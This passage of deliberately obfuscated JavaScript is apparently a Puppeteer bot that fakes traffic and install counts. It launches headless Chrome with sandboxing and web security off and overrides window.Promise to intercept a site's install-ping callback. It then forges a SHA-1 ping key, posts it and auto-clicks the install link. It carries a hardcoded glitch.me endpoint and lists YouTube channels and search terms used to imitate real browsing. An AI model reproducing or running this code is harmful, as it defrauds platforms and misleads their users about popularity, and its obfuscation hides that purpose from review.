                K = Q[J - (-0x16eb * -0x1 + -0x1443 + -0x2a5)] ^ Q[J - (0x29 * -0x62 + 0xad4 + 0x4e6)] ^ Q[J - (0xc15 + -0x27e + 0x989 * -0x1)] ^ Q[J - (-0xc6 * -0x18 + -0x1c06 + 0x35 * 0x2e)], Q[J] = K << 0x1a7 + 0x1 * -0x1bc5 + 0x9 * 0x2e7 | K >>> -0x4ad + -0x16f3 * -0x1 + -0x1 * 0x1227;
              for (J = -0x3 * 0xef + 0x1d3d + 0x34e * -0x8; J < 0xa * 0x2ea + -0x15f1 * 0x1 + -0x71f * 0x1; J += 0x1af * -0xc + 0x435 * 0x1 + 0x29 * 0x64)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x515 * -0x5 + -0x1e4c + -0x4e8 * -0x1 | L >>> -0x1 * -0xf93 + 0x170e + -0x2686 * 0x1) + (M & N | ~M & O) + P + (-0x1 * -0x9229ee85 + -0x13314c58 + -0x24762894 * 0x1) + Q[J] << -0x50f * 0x6 + 0x2364 + -0x1 * 0x50a) << -0x19 * -0xd + -0x1eb5 * 0x1 + 0x1d75 | P >>> 0x3 * 0x2d3 + 0x19a2 + -0x2200) + (L & (M = M << -0x17 * -0x155 + -0xdbd * -0x2 + -0x39ff | M >>> -0xbd * -0x34 + 0xdeb + -0x3 * 0x116f) | ~L & N) + O + (-0x504fe229 + 0x5aa2 * 0x108a9 + 0x4d1f76d0) + Q[J + (0x4c6 + -0x1e6 * 0x12 + 0x3 * 0x9cd)] << 0x25f4 + 0x265 * 0xd + -0x4515) << -0x60d * 0x2 + -0xde8 + 0x1a07 | O >>> 0x1 * -0x1bd2 + -0x5 * -0x64e + -0x399) + (P & (L = L << -0x10b9 * 0x2 + -0x1cc4 + 0x3e54 | L >>> -0x1bb3 + -0xdf * 0xd + 0x2708) | ~P & M) + N + (-0x1 * 0x3ca73b9d + 0x88469cb4 + -0xbaa * -0x146bd) + Q[J + (-0x3 * -0x31a + -0xd12 + -0x1 * -0x3c6)] << 0x1a7b * -0x1 + -0x179c + -0x3217 * -0x1) << 0x533 + 0x1 * -0x1e89 + 0x1 * 0x195b | N >>> 0x590 + -0x1 * -0x1dcf + -0x2344) + (O & (P = P << 0x28 * -0xec + 0xf * 0x51 + 0x203f * 0x1 | P >>> -0x202d + 0x4e1 + 0x1b4e) | ~O & L) + M + (0x689836a0 + -0x1572ec54 + -0x75d2f4d * -0x1) + Q[J + (-0x8e0 + -0xf8a + -0xa9 * -0x25)] << 0xa6 * 0x7 + 0x1 * 0x801 + -0xc8b) << -0x25 * 0xd1 + -0x5 * 0x2cf + -0x7 * -0x653 | M >>> -0x33b * 0x2 + 0x13ca + -0xd39) + (N & (O = O << 0x142f + -0x2 * -0x269 + 0x1 * -0x18e3 | O >>> 0xe27 + -0x11e3 + 0x3be) | ~N & P) + L + (0x2 * 0x4d812ac7 + -0x688cbcfd + 0x280ce108) + Q[J + (-0x1b20 + -0x2b * 0x86 + -0x9b * -0x52)] << 0x1764 + 0xd5c + -0x24c0, N = N << -0x1 * 0x1145 + 0x1 * -0x24fa + -0x1 * -0x365d | N >>> -0x1bbb + -0x1bd8 + -0x1b * -0x20f;
              for (; J < -0x1 * -0x199d + 0xb0 * -0x25 + -0x1 * 0x5; J += -0x2 * -0x5ad + 0x2 * 0xbb1 + 0x22b7 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * 0x41b + 0x2 * 0xbf5 + -0x1 * 0x2851 | L >>> 0x4e3 + -0x124c + 0xd84) + (M ^ N ^ O) + P + (-0xf * 0xb04bb09 + -0xb569b902 * 0x1 + -0xe4c54d15 * -0x2) + Q[J] << -0x29e + 0x19dc + 0x46 * -0x55) << 0x126 * -0xb + -0x79d * 0x5 + 0x32b8 | P >>> -0x16a4 + -0xf61 * 0x1 + 0x2620) + (L ^ (M = M << -0x1 * -0x259f + 0x1 * -0x1597 + -0x15 * 0xc2 | M >>> -0x14fe + 0x34 * 0xbc + -0x370 * 0x5) ^ N) + O + (-0x1188aa82 + -0x3beb958a + 0xbc4e2bad) + Q[J + (0xb77 + 0x12f4 + 0xf35 * -0x2)] << -0x266 + 0xd56 + 0x2 * -0x578) << 0xb15 * -0x3 + -0x150c + 0x10 * 0x365 | O >>> 0x16 * 0x11 + 0x11 * 0x221 + -0x216 * 0x12) + (P ^ (L = L << -0x19b6 + -0x45b * -0x5 + -0x1 * -0x40d | L >>> 0x1ec5 + -0x2092 + 0x1 * 0x1cf) ^ M) + N + (0x1 * -0xc149453f + 0x1 * -0xb1359863 + 0x1e158c943) + Q[J + (0x57e + 0x1 * 0x20d6 + -0x2652)] << 0x109 + -0x25fe + 0x24f5) << -0x29 * 0xa + 0x71a + -0x3d * 0x17 | N >>> -0x248e + 0x127b + -0x2 * -0x917) + (O ^ (P = P << 0xb5d + -0x168c + 0xb4d | P >>> 0x6d3 * -0x1 + 0x17ef + -0x111a) ^ L) + M + (0x2093670 * -0x5a + -0x2f5d4e87 + 0x155745d88) + Q[J + (-0x57 + -0x74d + 0x7a7 * 0x1)] << -0xf * 0x3e + 0x22a9 + 0x2f * -0xa9) << 0xa * -0x182 + 0x89 * -0x10 + -0x3 * -0x7e3 | M >>> 0x3bf * -0x9 + -0x227b + 0x444d) + (N ^ (O = O << 0x23f * 0x11 + 0x471 + -0x2a82 | O >>> -0x17b2 + -0x23dd + 0x3b91) ^ P) + L + (0xc7e75121 + -0x8b412e21 + 0x3233c8a1) + Q[J + (0x6ec * 0x1 + -0x1d2 * -0x2 + -0xa8c)] << 0x1ef4 + 0x605 + 0x3 * -0xc53, N = N << 0x3 * -0x453 + 0x1 * -0x26b + 0x2 * 0x7c1 | N >>> 0x1 * 0x22c + 0x1 * -0x43f + -0xd * -0x29;
              for (; J < 0x2c * 0x79 + -0x73 * -0x17 + -0xb * 0x2cf; J += -0x8 * -0x32 + -0x13 * 0x18d + 0x1bec)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x435 + 0x1271 + -0x1 * 0x16a1 | L >>> -0x16f * 0x11 + 0x1fe0 + -0x2 * 0x3b3) + (M & N | M & O | N & O) + P - (-0xa670b9d * -0x1 + 0x294b925b * -0x3 + -0x4896 * -0x31e64) + Q[J] << -0x9bb * -0x1 + -0x5d * 0x66 + 0x1b53) << -0xfa1 + -0x59f + 0x1545 | P >>> -0x1 * -0xdd2 + 0x18 * -0x196 + 0x1859) + (L & (M = M << -0x43 * -0xd + -0x12c6 + 0x1 * 0xf7d | M >>> -0x30 * -0x16 + 0x89b + 0x1 * -0xcb9) | L & N | M & N) + O - (0x5d7 * -0x20654 + -0x71fe1d45 + -0x8f51 * -0x1aa65) + Q[J + (-0x1 * -0x803 + 0x6 * -0x335 + 0xb3c)] << -0x937 + 0x26 * 0x6b + 0x239 * -0x3) << -0x315 + -0x210 + 0x52a * 0x1 | O >>> 0x7 * -0x4d7 + 0x13 * -0x47 + 0x2741) + (P & (L = L << 0x1 * 0x179 + 0x56 * -0x74 + -0x1 * -0x259d | L >>> -0xd57 + -0x793 + 0x14ec) | P & M | L & M) + N - (0x9b7494ef + -0x31 * -0x2fffcb3 + -0xbd8fb00e) + Q[J + (-0x5 * 0x550 + -0x9c3 + -0x83 * -0x47)] << -0x177 + 0x17 * -0x8f + -0x10 * -0xe5) << 0x208a + -0x63 * 0x1f + -0x12 * 0x124 | N >>> 0x1b0 * -0x17 + -0x2 * 0x1c3 + 0x35 * 0xcd) + (O & (P = P << 0x139b + -0x3b3 * 0x5 + 0x7f * -0x2 | P >>> -0x21da + -0x7 * -0x55f + -0xb * 0x57) | O & L | P & L) + M - (0x1 * -0x39bb4602 + 0x15795d38 + 0x95262bee) + Q[J + (-0xd9e + -0x9a3 + 0x1744)] << -0x176 + -0x164f + -0x1 * -0x17c5) << -0x2350 + -0x1adc + 0xb7 * 0x57 | M >>> 0x1a89 * -0x1 + -0x1 * -0x15b6 + 0x2 * 0x277) + (N & (O = O << 0x2648 + 0x151 * -0x15 + -0xa85 | O >>> 0x41 * -0x11 + -0x113a + -0x72f * -0x3) | N & P | O & P) + L - (-0xb722b8f5 + 0x868f119b + 0xa177ea7e) + Q[J + (-0x1222 * -0x1 + -0x15b1 + 0x1 * 0x393)] << 0x2a1 * 0x1 + -0x969 + 0x7 * 0xf8, N = N << 0x24cb + 0x21d * 0xe + -0x4243 | N >>> -0x839 * 0x1 + -0x34 * -0x41 + 0x43 * -0x13;
              for (; J < -0xb62 * 0x1 + 0x146b + -0x1 * 0x8b9; J += 0x1b33 + 0x7ef + -0x231d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1d7d + 0x20e0 + -0x35e * 0x1 | L >>> 0x162f + -0x1 * 0x21bb + 0xba7) + (M ^ N ^ O) + P - (-0x1ddd * 0x3833 + 0x1ae1831e + 0x214a0613) + Q[J] << -0xa7 * -0x2a + 0xa7b * 0x2 + -0x305c) << 0x5 * -0x6a9 + -0xc01 * -0x2 + 0x950 | P >>> 0x11 * -0x8f + 0x16f3 + 0xc9 * -0x11) + (L ^ (M = M << -0x1 * 0x2341 + 0x1ec + 0x2173 | M >>> 0x2406 + 0x8 * -0x1cf + -0x158c) ^ N) + O - (0x4d9f1b31 + -0x2c28e755 + 0x6b7ae1a * 0x3) + Q[J + (0x1b45 + -0x1b * -0xe1 + -0x7 * 0x749)] << 0x1f78 + -0xd6b + -0x120d) << -0x7 * -0x123 + -0x3 * 0xa8b + 0x17b1 * 0x1 | O >>> -0x156 + 0x13f1 * -0x1 + 0x2 * 0xab1) + (P ^ (L = L << 0x244b + 0x19ee * -0x1 + -0xa3f | L >>> 0x18af * -0x1 + -0x4e4 + 0x1d95) ^ M) + N - (-0x87 * -0xbf5a1b + 0x4ab2d552 + 0x89 * -0xe3f4fd) + Q[J + (0x5 * 0x1c8 + -0x1 * 0x13e1 + 0xafb)] << 0x7f * -0xe + 0x1836 + 0x1144 * -0x1) << -0x1 * 0x13a9 + -0x886 * -0x2 + -0x151 * -0x2 | N >>> 0x1fb7 + -0x1d * -0x146 + -0x448a) + (O ^ (P = P << 0xd66 + -0x399 * 0xa + 0x16b2 | P >>> 0xbc7 + -0x1af1 + 0x796 * 0x2) ^ L) + M - (0x1be0c * 0x313c + 0x9d3f * 0x1cd + -0x2146c319) + Q[J + (-0x2287 * 0x1 + 0x26ba + -0x430)] << 0x1be2 + 0x3 * 0x83 + -0x1d6b) << -0x1 * -0xf75 + 0x1e0c + -0x8e * 0x52 | M >>> 0x1380 + 0x3 * -0xa4b + 0xb7c) + (N ^ (O = O << -0x2529 + -0x1 * -0x1fab + -0x2 * -0x2ce | O >>> -0x7f5 * 0x3 + 0x269a + -0xeb9) ^ P) + L - (0x4ef3c556 + 0x56c6d5bf + -0x39dd9b5 * 0x1f) + Q[J + (-0x14 * 0x1b9 + -0xb84 + 0x2dfc)] << -0x1 * -0x2205 + -0x7 * -0xca + 0x278b * -0x1, N = N << -0x1b30 + -0x14b * 0xa + 0x283c | N >>> 0x2333 + 0x1106 + -0x3437;
              this['h0'] = this['h0'] + L << -0xf04 + 0x2 * 0x16b + 0xc2e, this['h1'] = this['h1'] + M << -0x961 + 0x103f * -0x1 + 0x19a0, this['h2'] = this['h2'] + N << 0x1 * 0xf1a + 0x1 * -0x8e + -0xe8c, this['h3'] = this['h3'] + O << -0x86 * -0x43 + -0xa6d + -0x9 * 0x2bd, this['h4'] = this['h4'] + P << 0x257b * -0x1 + -0x62f + 0x2baa;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x865 * -0x3 + -0x10c8 + 0xb * -0xc1 & 0x2255 + 0xaff * 0x3 + -0x4343] + w[J >> -0x1 * 0x1f2b + 0x355 + 0x1bee & 0x153d + 0x21ea + 0xa4 * -0x56] + w[J >> 0x736 * 0x5 + -0x12b3 + -0x1147 * 0x1 & 0xcf3 + 0x1bed + 0x51 * -0x81] + w[J >> -0x44a + 0x315 * -0x9 + -0x9b * -0x35 & -0x130 * -0x1f + -0x15ad * -0x1 + -0x1 * 0x3a6e] + w[J >> 0x1253 + 0xcf4 + -0x215 * 0xf & -0x1027 + 0x1 * 0xbcc + 0x46a] + w[J >> 0x192b + -0x1807 * 0x1 + 0x8e * -0x2 & -0x24f7 * 0x1 + -0x2a7 * 0x9 + 0x3ce5] + w[J >> -0x1c7f + 0x130e * -0x2 + -0x471 * -0xf & -0x1 * -0x21cb + -0x9ae * 0x2 + -0xe60] + w[0x43 * 0x33 + -0x1d29 + 0xef * 0x11 & J] + w[K >> 0x829 + 0x1a6b * 0x1 + 0x4 * -0x89e & -0x60a * 0x1 + -0x1ded + 0xae * 0x35] + w[K >> 0x1f55 + 0x1993 + -0x38d0 & 0x8b * -0x3f + -0x1d1a + 0x3f5e] + w[K >> 0x18a6 + 0x52 * -0x29 + -0xb70 & -0x1335 + -0xce6 + 0x202a * 0x1] + w[K >> -0x305 * -0x5 + 0x1 * 0x1926 + -0x282f & 0xdd * -0x3 + -0x740 * 0x1 + -0x9e6 * -0x1] + w[K >> 0x1 * 0x10ba + 0x147 * 0x10 + -0x251e & 0x1a76 + -0x1d * 0x3e + -0x1361 * 0x1] + w[K >> -0x2ba + -0x1b72 + -0x4 * -0x78d & 0x94c + -0x6d * -0x3 + -0xa84 * 0x1] + w[K >> -0x2 * 0x1175 + 0x1 * -0xc9 + -0x23b7 * -0x1 & 0x1f7d + -0x1bbf * 0x1 + 0x3af * -0x1] + w[-0x241 + -0x233e + -0xb * -0x36a & K] + w[L >> 0xdb9 + -0x1727 * -0x1 + -0x24c4 & 0x4d5 * -0x3 + -0x1f67 + -0x41 * -0xb5] + w[L >> 0x1 * 0x21a6 + 0x1 * 0x453 + -0x25e1 & -0x402 * -0x5 + 0x16df * -0x1 + 0x5 * 0x94] + w[L >> 0x1 * 0x1f51 + -0x23cb + 0x16 * 0x35 & -0x731 + 0x2401 * 0x1 + -0x1cc1] + w[L >> -0x6 * -0x2de + -0x74 * 0x1f + -0x318 & -0x5 * 0x494 + -0x20f0 + 0x37e3] + w[L >> -0x1c87 * 0x1 + 0x22aa + -0x617 & 0x126 * 0x2 + -0xf1 * 0xa + 0x72d] + w[L >> -0x1694 + -0x59 * -0x25 + 0x9bf & 0x18e7 + 0x1b9c + -0x3474] + w[L >> 0x1300 + -0x1cce + 0x9d2 & -0x1 * -0x1801 + 0x8bf + -0x20b1 * 0x1] + w[0x3e7 + -0xe99 + -0xac1 * -0x1 & L] + w[M >> 0x25f7 + 0x2de * -0x9 + -0xc0d & 0x1ebc + -0x768 * -0x1 + -0x1 * 0x2615] + w[M >> 0xb23 + -0x19b7 + 0xeac & 0x8a5 * -0x1 + 0x1c * -0x8a + 0x17cc] + w[M >> 0x22df + -0x260b + 0x340 & -0x275 + 0x411 + -0x18d] + w[M >> -0xf5 + 0x53d * 0x4 + 0x1b * -0xbd & -0xc2 * -0x24 + -0xab6 * 0x3 + 0x3 * 0x1a3] + w[M >> -0x5f0 + -0xd59 + -0x31 * -0x65 & 0x2f4 * -0x2 + 0x15d4 + -0xfdd] + w[M >> -0x1ef0 + -0x1579 + 0x3471 & 0x181 * 0x3 + 0x1b * 0x2f + -0xb * 0xdb] + w[M >> 0x1589 + 0x1656 + 0x67 * -0x6d & 0x11c0 + -0x9 * 0x101 + -0x22a * 0x4] + w[-0x16d + -0x205d + 0x21d9 & M] + w[N >> -0x19ea + 0x103 * -0x12 + -0x4 * -0xb0f & 0x72 * -0x2 + 0x2023 + -0x10 * 0x1f3] + w[N >> 0xd * 0x20e + 0x90c * 0x2 + -0x2cb6 & 0x33d * -0x3 + 0x16b7 * -0x1 + 0x207d] + w[N >> 0xe87 + -0x136c + 0x4f9 & 0x1011 + -0x7 * 0x45d + 0xe89 * 0x1] + w[N >> 0x830 + -0xf55 + -0x1 * -0x735 & 0x530 * -0x2 + -0x1 * 0x5e6 + 0x1055] + w[N >> -0x1f44 + -0x14f * -0x17 + -0x1 * -0x137 & -0x2 * 0x4db + 0xf71 * 0x1 + -0x5ac] + w[N >> -0x240e + 0xcb3 * -0x1 + 0x30c9 & 0x113c + 0x4 * -0x265 + 0x1 * -0x799] + w[N >> -0x6f * 0x55 + 0x1 * -0x8bd + 0x2d9c & -0x33b + -0x7 * 0x4eb + 0x25b7] + w[-0xd9 * -0xe + 0x1c2b * -0x1 + -0x15d * -0xc & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xa8e + 0x1cd * 0xb + -0x929 & -0xd72 + 0x750 + 0x721,
                J >> 0x1 * 0x67f + -0x2014 + 0x19a5 & -0x1221 + -0x2211 + -0x3 * -0x11bb,
                J >> 0x16 * -0x72 + -0xa19 * -0x3 + -0x1477 & 0x133e + 0x1 * 0x1c99 + -0x2ed8 * 0x1,
                0x1377 * -0x1 + -0x2533 * 0x1 + 0x39a9 * 0x1 & J,
                K >> 0x1 * 0x9af + -0xd75 + -0x6 * -0xa5 & -0x1b76 + 0x4fa + 0x1 * 0x177b,
                K >> 0x18c1 * 0x1 + -0x3 * 0xa76 + 0x6b1 & -0x9d0 + 0x128e + 0x7bf * -0x1,
                K >> 0x1 * -0x15da + -0x9b4 + -0xd * -0x26e & -0x1874 + -0x1f9d + 0x3910,
                -0xae3 * 0x1 + -0x24a5 + 0x3087 & K,
                L >> -0x13 * -0x83 + 0x1cdc + -0xa7 * 0x3b & -0x2484 + 0x293 * 0x9 + -0x36 * -0x44,
                L >> -0x1 * 0x964 + 0x1 * -0x19e2 + 0x2356 & 0x1c50 * 0x1 + -0xd70 + -0xde1,
                L >> -0x913 + -0x22c3 * 0x1 + 0x2bde & -0x1b41 + 0x2b4 + -0x4 * -0x663,
                0x247e + 0x1 * -0x48c + -0x3 * 0xa51 & L,
                M >> -0x1d3f * -0x1 + -0x81f + -0x1508 & -0xa14 + -0x5 * 0x9b + -0x1 * -0xe1a,
                M >> 0x8ec * -0x4 + 0x1a41 + 0xbb * 0xd & 0x168d + 0x15c * -0x14 + -0x2 * -0x2d1,
                M >> 0x210 * 0x5 + 0x6b7 * 0x3 + 0x1e6d * -0x1 & 0x1 * 0x1979 + 0x1817 * 0x1 + -0x3091 * 0x1,
                0x159e + 0x25a5 + 0x54c * -0xb & M,
                N >> -0x1c7 + 0x1348 + -0x1169 & 0x1caa + -0x98e + 0x121d * -0x1,
                N >> -0x4bc * 0x4 + -0x254b * 0x1 + 0x384b & -0x1a30 + -0xa * 0x53 + 0x1e6d * 0x1,
                N >> -0x65 * -0x3 + 0x240f + 0x1b1 * -0x16 & -0x13 * 0x18f + -0x1 * 0x210d + 0x3fa9,
                0x1294 + 0x1 * -0xedb + -0x2ba * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x3d5 + -0x1123 + 0x1 * 0x150c), (K = new DataView(J))['setUint32'](0x2272 + -0x174b * 0x1 + -0xb27, this['h0']), K['setUint32'](-0xab * 0x2d + 0x1 * -0x115d + 0x10 * 0x2f7, this['h1']), K['setUint32'](0x7fd + 0x1 * -0x2499 + -0x263 * -0xc, this['h2']), K['setUint32'](0x5 * -0x509 + -0x1 * 0x519 + 0x1e52, this['h3']), K['setUint32'](-0x10d * 0xb + -0x257 + 0xdf6, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x16cd * 0x1 + -0x1b96 + 0x4c9];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xdac + -0x3bd + 0x1169 * 0x1;
            J[0xcc * 0xe + -0x1f67 * -0x1 + 0x883 * -0x5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x9b4 + 0x12a4 + 0x716 * -0x4] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1ece * -0x1 + 0x1ca6 + -0x13d1 * 0x3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1768 + -0x1 * 0x2513 + -0x1f4 * -0x7;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xac9 + 0x6 * 0x3f1 + -0x1c93), Promise['resolve'](0x18d * -0xf + -0x114f + 0x2893);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x4 * -0x533 + -0x8eb + -0xbe1; j < 0x1 * 0xda3 + 0x7d7 * -0x3 + 0x9e3; j++)
    i();
}
const NETWORK_PATIENCE = 0x2bee * -0x1 + -0x3d56 + -0x1 * -0x8884 + (-0x5 * 0x95 + -0x12 * -0x77 + 0x643 * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x14 * 0x2f + 0x70b + -0x112 * 0xa) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xa * -0x13a + 0x1 * -0xc23 + 0x1867 * 0x1);
    let h = e[f];
    if (c['GoKEaU'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x73 * 0x25 + 0xd0b + -0x1daa, r, s, t = 0x4 * -0x5 + -0x2 * -0x319 + -0x61e; s = m['charAt'](t++); ~s && (r = q % (0x1aa8 + 0x145c * 0x1 + -0x4 * 0xbc0) ? r * (0x1f * 0x1d + -0x26 * -0x7a + 0x155f * -0x1) + s : s, q++ % (-0x613 + 0x2 * -0xa63 + 0x1add)) ? o += String['fromCharCode'](0xeac + -0x1 * -0x25d9 + -0x3386 & r >> (-(-0x2b * -0xd4 + 0x1 * 0x6b2 + -0x2a4c) * q & 0xaeb + 0x1ba6 + -0x268b)) : -0xd6f + 0x1ab8 + -0xd49) {
          s = n['indexOf'](s);
        }
        for (let u = 0x144 + -0x7e1 * 0x3 + 0x165f, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xccb + -0x14c8 + 0x21a3))['slice'](-(-0xd1 * 0x1d + 0x2093 * 0x1 + -0x8e4));
        }
        return decodeURIComponent(p);
      };
      c['hjimNE'] = i, b = arguments, c['GoKEaU'] = !![];
    }
    const j = e[0x2 * 0x72f + 0x26ef + -0xaa9 * 0x5],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hjimNE'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x3 * -0x82b + 0x12f0 + -0x2b71; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x16 * 0x125 + -0x1a53 * 0x1 + 0x338b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1ee8 + 0x2dc 